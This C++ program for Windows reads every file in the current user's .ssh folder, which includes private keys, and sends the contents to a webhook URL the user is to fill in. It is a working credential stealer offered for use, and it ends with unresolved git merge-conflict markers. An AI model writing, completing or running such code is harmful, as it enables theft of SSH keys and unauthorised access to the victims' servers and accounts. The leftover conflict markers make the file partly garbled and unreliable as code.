#include <string>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include "sendRequest.h"

namespace fs = std::filesystem;

int main()
{
	std::string message;
	
	//Place your Webhook URL here
	std::string url = "";

	// Get Username
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);
	std::string user = username;

	std::string path = "C:\\Users\\" + user + "\\.ssh";
	std::string currentOutput;
	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		currentOutput = entry.path().string();

		message += currentOutput + "\n";
		std::ifstream file;
		file.open(currentOutput);
		std::string fileOutput;
		if (file.is_open())
		{
			while (std::getline(file, fileOutput))
			{	
				message += fileOutput.c_str() + std::string("\n");
			}
		}
	}
	sendRequest(url, message);
<<<<<<< HEAD

	return 0;
}
=======
}
>>>>>>> 814d1575542273b6cdb3043b1623fa006bae6474
